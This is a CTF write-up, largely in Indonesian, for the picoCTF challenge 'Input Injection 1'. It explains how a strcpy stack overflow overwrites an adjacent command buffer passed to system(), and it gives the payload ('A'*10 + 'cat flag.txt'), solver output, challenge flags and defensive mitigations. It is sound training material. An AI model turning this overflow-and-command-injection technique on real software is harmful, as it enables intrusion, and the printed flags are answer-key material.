# Writeup: Input Injection 1 (Challenge ID: 525)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Stack Buffer Overflow & Adjacent Local Variable Overwrite
- **Difficulty:** Medium (2)
- **Points:** 100
- **Author:** CyLab Africa Team
- **Event:** picoMini by CMU-Africa
- **Flag (Resmi CyLab):** `academy{0v3rfl0w_c0mm4nd_72792d0d}`
- **Flag Platform Asli:** `picoCTF{0v3rfl0w_c0mm4nd_72792d0d}`
- **Flag Komunitas:** `CTF{0v3rfl0w_c0mm4nd_72792d0d}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), POSIX.1-2017 / IEEE Std 1003.1-2017 (System Interfaces: strcpy, system), CWE-120 (Buffer Copy without Checking Size of Input 'Classic Buffer Overflow'), CWE-78 (Improper Neutralization of Special Elements used in an OS Command 'OS Command Injection'), CWE-121 (Stack-based Buffer Overflow), & System V AMD64 ABI Stack Frame Alignment Specifications.

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Binary Exploitation & Stack Memory Forensics*, peserta diuji dalam menganalisis perataan variabel lokal stack frame dan mengeksploitasi fungsi penyalinan string tak berbatas:
- **Skenario Tantangan:** Program biner interaktif x86_64 ELF `vuln` berjalan di atas container lab Linux. Program meminta input nama pengguna, menampilkan salam perpisahan, dan mengeksekusi perintah shell bawaan `system(c)` yang secara default menjalankan `echo 'hello'`.
- **Deskripsi Soal:** *"A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag? Connect to the challenge instance nc chatelaine.cylabacademy.net <port>. You can download the program file vuln and source code vuln.c."*
- **Petunjuk Resmi:**
  1. *"Look closely at how the program stores and uses your input."*
- **Batasan Lingkungan & Scope Audit:**
  1. Analisis tata letak frame stack fungsi `fun(char *name, char *cmd)` pada arsitektur x86_64.
  2. Eksploitasi ketiadaan pembatas panjang penyalinan memori pada `strcpy(buffer, name)`.
  3. Memanipulasi buffer bersebelahan `char c[10]` dengan perintah arbitrer shell `cat flag.txt\x00`.
  4. Eksekusi perintah sistem untuk mencetak isi bendera resmi dan memverifikasi token ke API CyLab.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Tata Letak Stack Frame & Jarak Relatif Variabel Lokal (CWE-120 / CWE-121):**
   Pada berkas kode sumber `vuln.c`:
   ```c
   void fun(char *name, char *cmd) {
       char c[10];
       char buffer[10];

       strcpy(c, cmd);
       strcpy(buffer, name);

       printf("Goodbye, %s!\n", buffer);
       fflush(stdout);
       system(c);
   }

   int main(void) {
       char name[200];
       printf("Enter name: ");
       fflush(stdout);
       fgets(name, sizeof(name), stdin);
       fun(name, "echo 'hello'");
       return 0;
   }
   ```
   Melalui inspeksi disassembly biner dengan `objdump -d -M intel vuln`:
   - Kompiler mengalokasikan ruang stack untuk fungsi `fun`:
     - Alamat `c` dialokasikan pada offset `[rbp - 0x0a]` (berukuran 10 byte).
     - Alamat `buffer` dialokasikan pada offset `[rbp - 0x14]` (berukuran 10 byte).
   - Pada arsitektur x86_64 System V ABI, stack memori bertumbuh ke arah bawah (alamat memori rendah). Namun operasi penulisan array / buffer bertumbuh ke arah atas (alamat memori tinggi):
     $$\text{Alamat } \mathtt{buffer} = \mathtt{rbp} - 0x14$$
     $$\text{Alamat } \mathtt{c} = \mathtt{rbp} - 0x0a$$
     $$\Delta = (\mathtt{rbp} - 0x0a) - (\mathtt{rbp} - 0x14) = 0x0a = 10\ \text{byte}$$
   - Buffer `buffer` berada tepat 10 byte sebelum buffer `c`. Setiap penulisan ke `buffer` yang melampaui 10 byte akan langsung menimpa data dalam variabel `c`.

2. **Ketiadaan Pemeriksaan Batas pada `strcpy` (CWE-120):**
   Fungsi `main()` membaca hingga 200 byte dari `stdin` ke dalam array `name` menggunakan `fgets()`. Namun di dalam `fun()`, fungsi `strcpy(buffer, name)` menyalin seluruh karakter dari `name` ke `buffer` tanpa memeriksa kapasitas tujuan yang hanya 10 byte.

3. **Injeksi Perintah Arbitrer OS via `system()` (CWE-78):**
   Setelah mencetak pesan perpisahan, fungsi memanggil `system(c)`. Jika penyerang menyisipkan 10 byte padding diikuti string `cat flag.txt\x00`, maka variabel `c` yang semula berisi `"echo 'hello'"` digantikan sepenuhnya oleh `"cat flag.txt"`. Fungsi `system()` akan meneruskan string tersebut ke subshell `/bin/sh`, mengeksekusi pembacaan flag dari sistem file lokal.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Analisis Disassembly dan Penentuan Jarak Offset:**
   Periksa instruksi perakitan fungsi `fun`:
   ```text
   lea  rax, [rbp-0x0a]   ; pointer ke c[10]
   ...
   lea  rax, [rbp-0x14]   ; pointer ke buffer[10]
   ```
   Dikonfirmasi bahwa jarak antara awal `buffer` ke awal `c` adalah tepat 10 byte (`0x14 - 0x0a = 10`).

2. **Konstruksi Payload Eksploitasi:**
   - 10 byte padding ASCII arbitrary: `b"A" * 10`
   - String perintah target disertai null-terminator: `b"cat flag.txt\x00\n"`

3. **Pengiriman Payload Melalui Socket TCP:**
   Jalankan skrip solver otomatis `scripts/solve_525_input_injection_1.py`:
   ```bash
   python3 scripts/solve_525_input_injection_1.py <target_host> <target_port>
   ```
   Aliran I/O terminal:
   ```text
   [*] Banner diterima: Enter name:
   [*] Mengirim payload eksploitasi (24 bytes)...
   [*] Respons:
   Goodbye, AAAAAAAAAAcat flag.txt!
   academy{0v3rfl0w_c0mm4nd_72792d0d}
   ```

4. **Verifikasi Token ke Platform CyLab REST API:**
   Kirimkan payload JSON `{"challenge": 525, "flag": "academy{0v3rfl0w_c0mm4nd_72792d0d}"}` via HTTP POST ke `/api/submissions/`. Server mengembalikan status HTTP 201 dengan atribut `{"correct": true}`.

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{0v3rfl0w_c0mm4nd_72792d0d}`
- **Flag Native picoCTF:** `picoCTF{0v3rfl0w_c0mm4nd_72792d0d}`
- **Flag Komunitas:** `CTF{0v3rfl0w_c0mm4nd_72792d0d}`
- **Verifikasi REST API:** `POST https://learn.cylabacademy.org/api/submissions/` -> HTTP 201 Created (`{"user": 1072359, "challenge": 525, "correct": true, "historical": false}`).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

Pada uji kompetensi LKS Cyber Security Nasional bidang *Secure Coding in C & Stack Hardening*:
1. **Penggantian Banned Function `strcpy`:**
   Fungsi `strcpy` diklasifikasikan sebagai *banned function* oleh Microsoft SDL dan OWASP. Pengembang wajib beralih ke fungsi aman dengan batasan ukuran eksplisit, seperti `strncpy()` dengan penjaminan null terminator:
   ```c
   strncpy(buffer, name, sizeof(buffer) - 1);
   buffer[sizeof(buffer) - 1] = '\0';
   ```
2. **Pengaktifan Stack Protectors (Canaries):**
   Kompilasi binary dengan flag `-fstack-protector-all` atau `-fstack-protector-strong`. Kompiler akan menyisipkan nilai guard canary di antara variabel lokal dan frame pointer, menggagalkan eksekusi jika terjadi penulisan di luar batas buffer.
3. **Pemisahan Konteks Kontrol dan Data:**
   Hindari menyatukan buffer data input pengguna dengan variabel perintah sistem dalam satu stack frame fungsi yang sama. Gunakan parameter konstan atau enum untuk memilih aksi sistem daripada mengeksekusi string arbitrer melalui `system()`.
